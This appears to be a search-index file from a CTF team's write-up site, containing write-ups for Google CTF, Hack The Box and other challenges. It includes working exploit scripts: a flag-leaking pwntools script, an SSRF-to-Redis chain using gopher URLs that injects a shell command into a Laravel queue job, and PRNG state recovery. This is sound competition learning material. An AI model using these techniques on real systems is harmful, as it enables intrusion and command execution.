var __index = {"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"write-ups.html","title":"Write ups","text":""},{"location":"write-ups.html#google-ctf-2023","title":"Google CTF 2023","text":"<ul> <li>Mine the gap</li> <li>Write flag where</li> </ul>"},{"location":"write-ups.html#hack-the-box","title":"Hack The Box","text":"<ul> <li>Screen Crack</li> </ul>"},{"location":"competitions/index.html","title":"Write ups","text":"<p>Collection of write-ups for various CTFs and tasks our team has completed.</p>"},{"location":"competitions/index.html#other-write","title":"Other write","text":""},{"location":"competitions/Google-CTF-2023/index.html","title":"Google CTF 2024","text":"<p>  |  |  |  </p>"},{"location":"competitions/Google-CTF-2023/mine-the-gap.html","title":"Mine the gap","text":"<p>You are given a script <code>minesweeper.py</code>, and a text file, <code>gameboard.txt</code>. Invoking the python script requires <code>pygame</code> to be installed.</p> <pre><code>pip install pygame\n</code></pre> <p>It takes several seconds to load. After loading, we get a minesweeper game</p> <p></p> <p>Inspect the script and search for CTF / FLAG etc.</p> <p>We see this part of the code:</p> <pre><code>    if len(violations) == 0:\n        bits = []\n        for x in range(GRID_WIDTH):\n            bit = 1 if validate_grid[23][x].state in [10, 11] else 0\n            bits.append(bit)\n        flag = hashlib.sha256(bytes(bits)).hexdigest()\n        print(f'Flag: CTF{{{flag}}}')\n\n    else:\n        print(violations)\n</code></pre> <p>We need to solve it, and then we can reconstruct the flag from the solution.</p> <p>Inspect <code>gameboard.txt</code> -- it looks like the board is in a simple text format.</p> <p>The board looks pretty structured. Putting one mine will collapse many other cells, but not all.</p> <pre><code>\u276f wc gameboard.txt\n    1631  198991 5876831 gameboard.txt\n</code></pre> <p>The board is 1600 x 3600 cells. It is huge. It is not possible to solve it by hand.</p> <p>We need to solve the board with code.</p> <p>Idea 1 use backtracking and pray to be fast enough.</p> <p>Idea 2 skip backtracking and use SAT solver (Z3). This is what we did.</p> <p>With Z3, we can create variables and constraints on the values they can get, then ask for a solution. If there is a solution, Z3 will give us the values for the variables. Z3 will find an answer in a reasonable\u2122\ufe0f time.</p> <p>Check the code to generate the solution. With the answer, we can easily recover the flag using the game's code.</p> <pre><code>import z3\n\nwith open('gameboard.txt') as f:\n    data = f.read().split('\\n')\n\n\nrows = len(data)\ncols = len(data[0])\nprint(rows, cols, flush=True)\n\nsolver = z3.Solver()\n\nvars = {}\n\ndef get_var(i, j):\n    assert data[i][j] == '9'\n    if (i, j) not in vars:\n        vars[i, j] = z3.Int(f'var_{i}_{j}')\n        solver.add(0 &lt;= vars[i, j])\n        solver.add(vars[i, j] &lt;= 1)\n    return vars[i, j]\n\n\nfor i in range(rows):\n    for j in range(cols):\n        if data[i][j] in '12345678':\n            flags_on = 0\n            pending = []\n\n            for dx in [-1, 0, 1]:\n                for dy in [-1, 0, 1]:\n                    if dx == 0 and dy == 0:\n                        continue\n\n                    nx = i + dx\n                    ny = j + dy\n\n                    if 0 &lt;= nx &lt; rows and 0 &lt;= ny &lt; cols:\n                        if data[nx][ny] == 'B':\n                            flags_on += 1\n                        elif data[nx][ny] == '9':\n                            pending.append(get_var(nx, ny))\n\n            if not pending:\n                continue\n\n            solver.add(z3.Sum(pending) + flags_on == int(data[i][j]))\n\nprint(len(vars))\n\nfor i in range(rows):\n    for j in range(cols):\n        if data[i][j] == '9':\n            assert (i, j) in vars\n\nprint(\"Solving...\")\nprint(solver.check())\n\nfor (i, j), v in vars.items():\n    if solver.model()[v] == 1:\n        print(i, j)\n</code></pre>","tags":["misc","game","z3"]},{"location":"competitions/Google-CTF-2023/write-flag-where.html","title":"Write flag where","text":"<p>This challenges had three parts with increasing difficulty. During competition we solved up to part 2. The solution to part 2 uses a very nice trick that was not the intended solution.</p>","tags":["rev"]},{"location":"competitions/Google-CTF-2023/write-flag-where.html#part-1","title":"Part 1","text":"<p>In this problem you are given a binary <code>chal</code> with a library <code>libc.so.6</code>.</p> <pre><code>\u276f file chal\nchal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=325b22ba12d76ae327d8eb123e929cece1743e1e, for GNU/Linux 3.2.0, not stripped\n\n\u276f file libc.so.6\nlibc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=69389d485a9793dbe873f0ea2c93e02efaa9aa3d, for GNU/Linux 3.2.0, stripped\n</code></pre> <p>Ok, this is an ELF binary, dynamically linked, we can run it on Linux.</p> <p>We are also given a server we can connect to:</p> <pre><code>nc wfw1.2023.ctfcompetition.com 1337\n\nThis challenge is not a classical pwn\nIn order to solve it will take skills of your own\nAn excellent primitive you get for free\nChoose an address and I will write what I see\nBut the author is cursed or perhaps it's just out of spite\nFor the flag that you seek is the thing you will write\nASLR isn't the challenge so I'll tell you what\nI'll give you my mappings so that you'll have a shot.\n5626cbcd7000-5626cbcd8000 r--p 00000000 00:11e 810424                    /home/user/chal\n5626cbcd8000-5626cbcd9000 r-xp 00001000 00:11e 810424                    /home/user/chal\n5626cbcd9000-5626cbcda000 r--p 00002000 00:11e 810424                    /home/user/chal\n5626cbcda000-5626cbcdb000 r--p 00002000 00:11e 810424                    /home/user/chal\n5626cbcdb000-5626cbcdc000 rw-p 00003000 00:11e 810424                    /home/user/chal\n5626cbcdc000-5626cbcdd000 rw-p 00000000 00:00 0\n7f4d9e838000-7f4d9e83b000 rw-p 00000000 00:00 0\n7f4d9e83b000-7f4d9e863000 r--p 00000000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9e863000-7f4d9e9f8000 r-xp 00028000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9e9f8000-7f4d9ea50000 r--p 001bd000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9ea50000-7f4d9ea54000 r--p 00214000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9ea54000-7f4d9ea56000 rw-p 00218000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9ea56000-7f4d9ea63000 rw-p 00000000 00:00 0\n7f4d9ea65000-7f4d9ea67000 rw-p 00000000 00:00 0\n7f4d9ea67000-7f4d9ea69000 r--p 00000000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7f4d9ea69000-7f4d9ea93000 r-xp 00002000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7f4d9ea93000-7f4d9ea9e000 r--p 0002c000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7f4d9ea9f000-7f4d9eaa1000 r--p 00037000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7f4d9eaa1000-7f4d9eaa3000 rw-p 00039000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7ffe76706000-7ffe76727000 rw-p 00000000 00:00 0                          [stack]\n7ffe767e9000-7ffe767ed000 r--p 00000000 00:00 0                          [vvar]\n7ffe767ed000-7ffe767ef000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]\n\n\nGive me an address and a length just so:\n&lt;address&gt; &lt;length&gt;\nAnd I'll write it wherever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I will happily expire\n</code></pre> <p>Nice poem, it probably describes the functionality. In hindsight is obvious that it exactly describes its functionality (let's get there in a moment).</p> <p>We tried interacting with the server. After few attempts we figured out that passing something like they said (<code>&lt;address&gt; &lt;length&gt;</code>) where <code>address</code> is a hexadecimal string starting with <code>0x</code> would work (i.e the server wouldn't immediately close).</p> <p>Let's see inside the binary with Ghidra:</p> <p></p> <p>It takes some time to parse the code, and we see some weird artifacts like <code>undefined8</code> but other than that is pretty readable C code (like as much as you can expect from a decompiler and C code combination).</p> <p>In particular we see they are loading the flag from <code>flags.txt</code>, that is something that exist on the server, and its content is what we are looking for.</p> <p>The flag is read to <code>flag</code> variable in this code.</p> <p>The last part of the code seems interesting:</p> <pre><code>sVar2 = read(local_14,&amp;local_78,0x40);\nlocal_1c = (undefined4)sVar2;\niVar1 = __isoc99_sscanf(&amp;local_78,\"0x%llx %u\",&amp;local_28,&amp;local_2c);\nif ((iVar1 != 2) || (0x7f &lt; local_2c)) break;\nlocal_20 = open(\"/proc/self/mem\",2);\nlseek64(local_20,local_28,0);\nwrite(local_20,flag,(ulong)local_2c);\nclose(local_20);\n</code></pre> <p>Tip: In Ghidra you can rename variables or functions to make the code more readable. I haven't found a way to collapse blocks of code, that would be nice.</p> <p>Line by line what is happening:</p> <ul> <li>Read 0x40 (4 * 16 = 64) bytes from <code>local_14</code> file descriptor (i.e potentially stdin) to <code>local_78</code> buffer.</li> <li>...</li> <li>Parse this string as 0x%llx %u (i.e. 0x followed by hexadecimal number followed by a space and a decimal number). Store those numbers in <code>local_28</code> and <code>local_2c</code>.</li> <li>break if the amount of parsed elements is different from 2, or local2c is greater than 0x7f (127).</li> <li>Open <code>/proc/self/mem</code> (i.e. the memory of the current process) in write mode. O_O this seems dangerous.</li> <li>Seek to <code>local_28</code> (i.e. the address we passed to the server).</li> <li>Write the flag to the address we passed, with length <code>local_2c</code>.</li> <li>Close the file descriptor.</li> </ul> <p>Ok, this is great. We can write the flag to any address we want.</p> <p>We need to write it to some place where it will be printed.</p> <p>There is a loop, and the loop starts printing some instructions: <code>Give me an address and a length just so:...</code></p> <p>Let's try to write the flag there. How?</p> <p>Double clicking the text in Ghidra will show exactly where it is in the binary:</p> <p></p> <p>Now this address is relative to the binary, but we need to find where it is in memory. We do know that this text is stored in the <code>.rodata</code> section, and this section is mapped to an specific address in memory.</p> <p></p> <p>Fortunately we are given another hint:</p> <pre><code>ASLR isn't the challenge so I'll tell you what\nI'll give you my mappings so that you'll have a shot.\n</code></pre> <p>And they actually provide the mappings of the running binary in real time: This is the code that does that:</p> <pre><code>    local_c = open(\"/proc/self/maps\",0);\n    read(local_c,maps,0x1000);\n    close(local_c);\n    // ...\n    dprintf(local_14,\"%s\\n\\n\",maps);\n</code></pre> <p>The first five sections are the ones about the binary itself:</p> <pre><code>5626cbcd7000-5626cbcd8000 r--p 00000000 00:11e 810424                    /home/user/chal\n5626cbcd8000-5626cbcd9000 r-xp 00001000 00:11e 810424                    /home/user/chal\n5626cbcd9000-5626cbcda000 r--p 00002000 00:11e 810424                    /home/user/chal\n5626cbcda000-5626cbcdb000 r--p 00002000 00:11e 810424                    /home/user/chal\n5626cbcdb000-5626cbcdc000 rw-p 00003000 00:11e 810424                    /home/user/chal\n</code></pre> <p>The second column will show the mode of the section <code>w</code> means you can write, <code>x</code> means you can execute.</p> <p>With some trial and error we found that the third section was the one with <code>.rodata</code></p> <p>With basic arithmetic we computed where was the address with respect to the beginning of <code>.rodata</code>, and given we know the actual beginning of <code>.rodata</code> from the printed mappings, we knew where was the string address in memory. We wrote the flag there, and we got the flag in the next iteration of the loop.</p>","tags":["rev"]},{"location":"competitions/Google-CTF-2023/write-flag-where.html#part-2","title":"Part 2","text":"<p>Second challenge looks pretty much the same, but right now there is no string in the loop. We can't use the solution to the previous part.</p> <p>There are still few strings where we can write the flag to.</p> <p>We can overwrite the code itself, yikes.</p> <p>We got some time analyzing this problem and we found out something new &amp; problematic:</p> <pre><code>local_14 = dup2(1,0x39);\nlocal_18 = open(\"/dev/null\",2);\ndup2(local_18,0);\ndup2(local_18,1);\ndup2(local_18,2);\nclose(local_18);\nalarm(0x3c);\n</code></pre> <p><code>dup2</code> copies a file descriptor into another. <code>0</code> is stdin, <code>1</code> is stdout, <code>2</code> is stderr.</p> <p>Line by line:</p> <ul> <li>Copy stdout to file descriptor 0x39 (57).</li> <li>Open <code>/dev/null</code> in write mode.</li> <li>Copy <code>/dev/null</code> to stdin.</li> <li>Copy <code>/dev/null</code> to stdout.</li> <li>Copy <code>/dev/null</code> to stderr.</li> <li>...</li> <li>Set an alarm to 0x3c (60) seconds.</li> </ul> <p>So all usual way to talk about file descriptors are removed, and if we want to print to stdout we must print to 0x39.</p> <p>In this challenge we can write a prefix of the flag into any location, in particular it can be a prefix of size 1.</p> <p>We can write a prefix of the flag onto itself but shifted to the left, this way in the next iteration rather than writing the flag to some address, we will be writing the beginning of the string that starts at the flag address which is potentially a suffix of the flag.</p> <p>That means we can write any substring / character of the flag anywhere.</p> <p>... time passed</p> <p>One promising but unsuccessful idea was trying to jump to a different place in the code by writing some character of the flag. It turned out the expected solution was along this line, but we never made it work.</p> <p>We tried making the application crash / close / or even trying to exploit the alarm. I.e we needed to leak information from any mean possible.</p> <p>In this part, we didn't get any feedback from the server, i.e nothing was printed, the only feedback was either processing our input and do nothing, or closing if the input was invalid.</p> <p>Wait, that is some information... if the input was invalid it would close and we would get that information. How to use that to leak the flag.</p> <p>We need to make the input fail/succeed depending on parts of the flag.</p> <p>We had access to the pattern of <code>sscanf</code> that we can modify, and that is exactly what we did.</p> <p>We can overwrite the character <code>0</code> from the <code>sscanf</code> pattern with one character from the flag. Then we send a new input, with some character, and if the application doesn't exit, we guessed correctly that character.</p> <p>This way we can guess character one by one, on each step by iterating over all possible characters of the flag. The final script was actually quite slow, but did the job (partially). This is the script:</p> <pre><code>import string\nfrom pwn import *\nimport time\n\nflag_length = 40\n\ndef is_nth_char(index, ch, heap_delta=0xa0):\n\n    context.log_level = 'error'\n\n    conn = remote('wfw2.2023.ctfcompetition.com', 1337)\n    lines = conn.recvlines(timeout=1)\n\n    # parse addresses\n    print(len(lines))\n\n    _rodata = lines[5]\n    _heap = lines[8]\n\n    _rodata_address = int(_rodata.decode().split('-')[0], 16)\n    _heap_address = int(_heap.decode().split('-')[0], 16)\n\n    # print('.rodata : ', hex(_rodata_address))\n    # print('.heap : ', hex(_heap_address))\n\n    flag_address = _heap_address + heap_delta\n\n    format_str_offset = 188\n    format_str_address = _rodata_address + format_str_offset\n\n    # flag = flag[index:]\n\n    # TODO uncomment\n    conn.send(f'{hex(flag_address - index)} {flag_length}\\n'.encode())\n\n    # '0x%llx' -&gt; {flag[index]}'x%llx'\n    conn.send(f'{hex(format_str_address)} 1\\n'.encode())\n\n    # # check conn is alive\n    # try:\n    #     conn.recv()\n    # except EOFError:\n    #     assert False\n\n    for i in range(5):\n        try:\n            conn.send(f'{ch}x123 1\\n'.encode()) # test only is sscanf fails or not\n            sleep(0.2)\n        except EOFError:\n            return False\n\n    return True\n\npartial_flag = list('CTF{') + ['*'] * flag_length\n\nfor i in range(4, flag_length):\n\n    if partial_flag[i] != '*':\n        assert is_nth_char(i, partial_flag[i])\n        continue\n\n    for ch in string.ascii_lowercase + string.ascii_uppercase + string.digits + '_':\n        if is_nth_char(i, ch):\n            print(\"Success:\", i, ch)\n            partial_flag[i] = ch\n            break\n        else:\n            print(\"Failure:\", i, ch)\n\n        print(\"Flag: \", ''.join(partial_flag))\n\n    print(\"Flag: \", ''.join(partial_flag))\n</code></pre> <p>The hardest / more fragile part of the script was trying to detect if the connection was over or not.</p> <p>This predicted all the flag but the last character, since it was not in the set of candidates we were trying. That was guessed manually.</p>","tags":["rev"]},{"location":"competitions/Google-CTF-2024/index.html","title":"Google CTF 2024","text":"<p>  |  |  |  </p>"},{"location":"competitions/Hack-The-Box/index.html","title":"Hack the Box","text":""},{"location":"competitions/Hack-The-Box/screen-crack.html","title":"ScreenCrack","text":"","tags":["web"]},{"location":"competitions/Hack-The-Box/screen-crack.html#challenge-description","title":"Challenge description","text":"<p>New screenshot service just dropped! They talk alot but can they hack it?</p>","tags":["web"]},{"location":"competitions/Hack-The-Box/screen-crack.html#solution","title":"Solution","text":"","tags":["web"]},{"location":"competitions/Hack-The-Box/screen-crack.html#first-recon","title":"First recon","text":"<p>Our flag is in a file in the application directory.</p> <p>We have a Laravel 10.6.2 application runing which homepage said:</p> <p>Users can view screenshots and the source code of any entered URL using the free web service ScreenCrack. To protect user privacy, our service deletes all screenshots and source files. Our primary goal is to protect users from malicious, shady, and fraudulent links.</p> <p></p> <p>We can pass an URL. Let's take a look what we can do with it.</p> <p>We have two options linked to two different api endpoints:</p> <ul> <li><code>/api/getss</code> - Get the URL screenshot using the web \"https://api.screenshotmachine.com/?key=6b76b2&amp;dimension=1024x768&amp;url=\".$url and creates a temporally png file with a random name inside /www/public/ss/ path</li> <li><code>/api/get-html</code> - Made a request to the URL, read the response and add a txt file with page content inside /www/public/src/ path and render inside a iframe</li> </ul> <p>Additionally there is a job that delete generated files after some time using the next code.</p> <pre><code>public function deleteFile()\n{\n    $filepath = $this-&gt;buildFilePath();\n    system(\"echo '\".$this-&gt;uuid.\"'&gt;&gt;halo\");\n    system(\"rm \".$filepath);\n}\n</code></pre> <p>In local we can see the uuids removed by the job.</p> <p></p> <p>Important: All URLs are validated before send the request, so local URL aren't permited.</p> <p>We have also a local Redis application up and running. Feels like we need to make some SSRF tricks to communicate with Redis service.</p>","tags":["web"]},{"location":"competitions/Hack-The-Box/screen-crack.html#localhost-bypass","title":"Localhost Bypass","text":"<p>I tried using HackTricks urls to bypass localhost but nothing helps.</p> <p>After a while I found that some public domains resolves to 127.0.0.1 Available Public Wildcard DNS Domains pointing to localhost (127.0.0.1). And using <code>fbi.com</code> as domain we get access to local application.</p> <p></p> <p>Let's try to communicate with Redis service.</p>","tags":["web"]},{"location":"competitions/Hack-The-Box/screen-crack.html#redis-rce","title":"Redis RCE","text":"<p>Looking how to communicate with redis service through SSRF we can found multiple post that use the <code>gopher</code> schema. If we test the INFO command of redis with the URL <code>gopher://fbi.com:6379/_%0D%0AINFO%0D%0Aquit%0D%0A</code> we received the response of Redis:</p> <pre><code>...\n# Server\nredis_version:7.0.15\nredis_git_sha1:8cceef4b\nredis_git_dirty:0\nredis_build_id:b445ae7ca70219e7\nredis_mode:standalone\nos:Linux 6.8.11-arm64 aarch64\narch_bits:64\n...\n</code></pre> <p>And using this python script we can create payloads sending to Redis and try to get our flag using some LFI technique.</p> <pre><code>redis_cmd = \"\"\"\nINFO server\nquit\n\"\"\"\ngopherPayload = \"gopher://fbi.com:6379/_%s\" % redis_cmd.replace('\\r','').replace('\\n','%0D%0A').replace(' ','%20')\n\nprint(gopherPayload)\n</code></pre> <p>I tried to use Redis to create a PHP webshell like https://book.hacktricks.xyz/pentesting-web/file-inclusion#file-inclusion but we can't do this because Redis thrown error because <code>dir</code> and <code>dbfilename</code> config parameters cannot be changed.</p> <p>Looking in the official forum discussion someone says that we need to use the Redis key values generated by Laravel application. If we check the values of the keys generated by the application, we found that the key values are the instances of <code>App/Jobs/rmFile</code>, including the properties.</p> <pre><code>{\"uuid\":\"e65cb62f-5b72-4e6b-9cfd-5c2b91eaf47f\",\"displayName\":\"App\\\\Jobs\\\\rmFile\",\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"maxTries\":null,\"maxExceptions\":null,\"failOnTimeout\":false,\"backoff\":null,\"timeout\":null,\"retryUntil\":null,\"data\":{\"commandName\":\"App\\\\Jobs\\\\rmFile\",\"command\":\"O:15:\\\"App\\\\Jobs\\\\rmFile\\\":1:{s:9:\\\"fileQueue\\\";O:21:\\\"App\\\\Message\\\\FileQueue\\\":3:{s:8:\\\"filePath\\\";s:45:\\\"\\/src\\/f046b9ac-710b-426d-bb21-d08669b3c96d.txt\\\";s:4:\\\"uuid\\\";s:36:\\\"f046b9ac-710b-426d-bb21-d08669b3c96d\\\";s:3:\\\"ext\\\";s:3:\\\"txt\\\";}}\"},\"id\":\"OyW8xxRT4ydRNEXlRhNDdpSDOoeoEtyH\",\"attempts\":0}\n</code></pre> <p>\ud83e\udd14 What if we change the uuid value to made a RCE excecution when app excetute <code>echo</code> command that we see previously. And yes, it worked.</p> <p></p> <p>So, let's try to read the content of the flag exposed in a public directory, using the code <code>;mv /flag /www/public/src/flag.txt;echo</code> we can archieve it.</p>","tags":["web"]},{"location":"competitions/Hack-The-Box/screen-crack.html#exploit","title":"Exploit","text":"<pre><code>#!/usr/bin/python3\n\nimport requests\nimport re\nimport time\n\nHOST = 'http://94.237.62.79:46267'\n\ntry_again = False\n\ncookies = {'laravel_session': 'eyJpdiI6IjFEck5qN2tqam9TSERHRThtZXdFY0E9PSIsInZhbHVlIjoiV3hpRWwraTBGWDI1bThBZHRFSU4wOGxDbkt4VnJNdStTUFQrSGMxZGE3MEN5eWVGMVluNm5EZHNCaTJWNmxFY2JOR3Brc1p6dURCNmg2OHRCbFI2UkZUS1Y2OHA0Zmx4U0ZSbXVtMkRVZkRKTFI3bWxPUjRINU9sSU83Q21obnMiLCJtYWMiOiJmODVmZDZjNzczZTBlOGU1OGUwM2QyY2RhZTBmMTBhZWQ5NmE4ODMyMGE0NWQyZTA4OWNjYzJiNGUyNjE0MGE4IiwidGFnIjoiIn0%3D'}\n\n\ndef send_redis_cmd(cmd):\n    gopherPayload = \"gopher://fbi.com:6379/_%s\" % cmd.replace(\n        '\\r', '').replace('\\n', '%0D%0A').replace(' ', '%20')\n\n    res = requests.post(f'{HOST}/api/get-html',\n                        json={'site': gopherPayload},\n                        headers={'Content-Type': 'applcation/json'},\n                        cookies=cookies\n                        )\n    response = res.json()\n    txt_file = response['filename']\n\n    return requests.get(f'{HOST}{txt_file}', cookies=cookies)\n\n\nredis_cmd = \"\"\"\nrpop laravel_database_queues:default\nquit\n\"\"\"\n\nres = send_redis_cmd(redis_cmd)\n\nconvertedInstance = None\ntry:\n    code_to_exec = ';mv /flag /www/public/src/flag.txt;echo Done'\n    instance_re = re.compile(r'({\"uuid\".*:0})')\n    uuid_re = re.compile(\n        r's:36:\\\\\"[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}\\\\\"')\n    rmInstance = re.search(instance_re, res.text).group(0)\n    convertedInstance = re.sub(\n        uuid_re,\n        f's:{len(code_to_exec)}:\\\\\"{code_to_exec}\\\\\"',\n        rmInstance)\nexcept:\n    print(\"No instance saved. Try again\")\n    try_again = True\n\nredis_replace_cmd = f\"\"\"\nlpush laravel_database_queues:default '{convertedInstance}'\nlrange laravel_database_queues:default 0 10\nquit\n\"\"\"\n\nif convertedInstance is not None:\n    res = send_redis_cmd(redis_replace_cmd)\nelse:\n    print(\"Try again\")\n    try_again = True\n\nprint(\"Done. Waiting the cronjob...\")\n\nif not try_again:\n    while True:\n        print(\"Trying get flag value\")\n        r = requests.get(f'{HOST}/src/flag.txt', cookies=cookies)\n        if r.status_code != 404:\n            print(r.text)\n            break\n        time.sleep(60)\n</code></pre>","tags":["web"]},{"location":"competitions/Idek-CTF-2024/index.html","title":"Idek CTF 2024","text":"<p>  |  |  |  </p>"},{"location":"competitions/Idek-CTF-2024/index.html#notes","title":"Notes","text":"<p>Learn how to solve the next challenges:</p> <ul> <li>rev: Write me</li> <li>misc: Minecraft. writeup: 1</li> <li>web: Smarty</li> <li>pwn: gambler -- we solved this one, but not properly, learn how to exploit memory vulnerability. exploit.</li> </ul> <p>TO DO:</p> <ul> <li> Add category pyjail (Crator from this competition was a \"safe\" pyjail, the pyjail was not the weakness)</li> <li> Add resources for geoguesser:<ul> <li>https://geomastr.com/</li> <li>https://overpass-turbo.eu/ you can write queries with info from open streem map.</li> </ul> </li> <li> Add resources on how to run minecraft client.<ul> <li>Launcher (Client): multimc / prism / https://github.com/Diegiwg/PrismLauncher-Cracked Prism allows offline mode (I haven't been able to set it up)</li> </ul> </li> </ul>"},{"location":"competitions/Idek-CTF-2024/Seedy.html","title":"Seedy","text":"","tags":["crypto","mersenne","z3"]},{"location":"competitions/Idek-CTF-2024/Seedy.html#solution","title":"Solution","text":"<p>Solution using sage and Z3</p> <pre><code>#! /usr/bin/env python\nimport random\nfrom tqdm import trange\nfrom sage.all import matrix, GF, vector\nfrom Cryptodome.Util.number import long_to_bytes\nfrom re import search\n\n# from https://github.com/deut-erium/RNGeesus/blob/main/src/code_mersenne/\nfrom mersenne import BreakerPy\n\n\n# https://rbtree.blog/posts/2021-05-18-breaking-python-random-module/\nclass Twister:\n    N = 624\n    M = 397\n    A = 0x9908B0DF\n\n    def __init__(self):\n        self.state = [\n            [(1 &lt;&lt; (32 * i + (31 - j))) for j in range(32)] for i in range(624)\n        ]\n        self.index = self.N\n\n    @staticmethod\n    def _xor(a, b):\n        return [x ^ y for x, y in zip(a, b)]\n\n    @staticmethod\n    def _and(a, x):\n        return [v if (x &gt;&gt; (31 - i)) &amp; 1 else 0 for i, v in enumerate(a)]\n\n    @staticmethod\n    def _shiftr(a, x):\n        return [0] * x + a[:-x]\n\n    @staticmethod\n    def _shiftl(a, x):\n        return a[x:] + [0] * x\n\n    def get32bits(self):\n        if self.index &gt;= self.N:\n            for kk in range(self.N):\n                y = self.state[kk][:1] + self.state[(kk + 1) % self.N][1:]\n                z = [y[-1] if (self.A &gt;&gt; (31 - i)) &amp; 1 else 0 for i in range(32)]\n                self.state[kk] = self._xor(\n                    self.state[(kk + self.M) % self.N], self._shiftr(y, 1)\n                )\n                self.state[kk] = self._xor(self.state[kk], z)\n            self.index = 0\n\n        y = self.state[self.index]\n        y = self._xor(y, self._shiftr(y, 11))\n        y = self._xor(y, self._and(self._shiftl(y, 7), 0x9D2C5680))\n        y = self._xor(y, self._and(self._shiftl(y, 15), 0xEFC60000))\n        y = self._xor(y, self._shiftr(y, 18))\n        self.index += 1\n\n        return y\n\n    def getrandbits(self, bit):\n        return self.get32bits()[:bit]\n\n\ndef gf2tovec(v):\n    return [sum([2 ** j * int(v[i * 32 + j]) for j in range(32)]) for i in range(624)]\n\n\ndef get_initial_state(outputs, tbit):\n    num = len(outputs)\n    twister = Twister()\n    equations = [twister.getrandbits(tbit) for _ in range(num)]\n    Fp2 = GF(2)\n    n, m = num * tbit, 624 * 32\n    M = matrix(Fp2, n, m, sparse=False)\n    b = vector(Fp2, n)\n    for i in trange(num):\n        for j in range(tbit):\n            ii = i * tbit + j\n            v = equations[i][j]\n            while v:\n                nv = v &amp; (v - 1)\n                k = (v ^ nv).bit_length() - 1\n                M[ii, k] = 1\n                v = nv\n            b[ii] = (outputs[i] &gt;&gt; (tbit - 1 - j)) &amp; 1\n    # not sure if this is needed\n    # ke = M.right_kernel()\n    # for r in ke.basis():\n    #     assert M * r == 0\n    x = M.solve_right(b)\n    # assert M * x == b\n    state = gf2tovec(x)\n    # recovered_state = (3, tuple(state + [624]), None)\n    # random.setstate(recovered_state)\n    # for i in range(num):\n    #    assert outputs[i] == random.getrandbits(tbit)\n    return state\n\n\ndef recover_bytes_seed(state):\n    b = BreakerPy()\n    random.setstate((3, tuple(state + [624]), None))\n    outputs = [random.getrandbits(32) for _ in range(624)]\n    seed = b.get_seeds_python_fast(outputs)\n    return seed\n\n\nif __name__ == \"__main__\":\n    with open(\"output.txt\") as fo:\n        outputs = list(map(int, fo.read().strip()))\n    state = get_initial_state(outputs, 1)\n    seed = recover_bytes_seed(state)\n    flag = 0\n    for n in reversed(seed):\n        flag = (flag &lt;&lt; 32) ^ n\n    flag = long_to_bytes(flag)\n    flag = search(b'idek{[!-z]*}', flag).group(0).decode()\n    print(flag)\n</code></pre>","tags":["crypto","mersenne","z3"]},{"location":"competitions/Sekai-CTF-2024/index.html","title":"Sekai CTF 2024","text":"<p>  |  |  </p> <p>This competition had two new categories for us: <code>blockchain</code> and <code>ppc</code> (Professional Programming &amp; Coding). The latter is like regular competitive programming problems.</p> <p>There were some tasks we thought but didn't solve.</p>"},{"location":"competitions/Sekai-CTF-2024/index.html#tagless","title":"Tagless","text":"<p>https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/</p> <p>the trick was in the error page \ud83d\ude2f</p>"},{"location":"competitions/Sekai-CTF-2024/index.html#play-to-earn","title":"Play to earn","text":"<ul> <li> How to run a blockchain task locally?</li> <li> and in particular how to solve this one?</li> </ul> <p>By the number of solves this looks like a good first task to learn about <code>blockchain</code> category.</p>"},{"location":"competitions/Sekai-CTF-2024/index.html#calcql","title":"Calcql","text":"<p>Use Codeql to extract a function from a python code. The code is generated randomly (see <code>shuffler.py</code>). There are several methods <code>fn_*</code> that returns an integer by calling other methods. There are several methods <code>entry_*</code> that returns an integer by calling other <code>fn_*</code> methods. The goal is to find the <code>entry_*</code> method that returns the value 42 by sending a query in Codeql.</p> <ul> <li> Learn the basics of Codeql</li> </ul>"},{"location":"competitions/Sekai-CTF-2024/index.html#railgun","title":"Railgun","text":"<p>This was a hard ppc challenge, and we didn't make much progress on it.</p>"},{"location":"competitions/Sekai-CTF-2024/crack-me.html","title":"Crack me","text":"<p>Reverse engineering an Android app. It was a React Native application written in JS, and we used jadx to decompile it. The idea was to modify the JS and put the flag in the error message. The hard part was to decompile, modify, recompile, and sign the APK.</p> <p>Todo</p> <p>Add some resources on how to use jadx</p>","tags":["rev","android"]},{"location":"main/index.html","title":"C4ptur3Th3Fr0g","text":"<p>Write ups and useful resources collected from past experiences participating in Capture The Flag (CTF) competitions.</p> <p>Team: C4ptur3Th3Fr0g</p> <p>\ud83d\udea7 Website in construction</p>"},{"location":"main/index.html#contributing","title":"Contributing","text":"<p>The source code of this website is hosted in Github. To contribute to this project, you can open a pull request against the source code hosted in Github, or contact any collaborator to give you write access to the repository.</p> <p>The website is built using mkdocs material.</p> <ol> <li>Install mkdocs: <code>pip install mkdocs-material</code></li> <li>Clone the repository: <code>git clone git@github.com:c4ptur3th3fr0g/c4ptur3th3fr0g.github.io.git</code></li> <li>Develop locally: <code>mkdocs serve</code></li> <li>Deploy changes: <code>mkdocs gh-deploy</code></li> </ol>"},{"location":"main/index.html#to-do","title":"To Do","text":"<ul> <li> Build the website after every 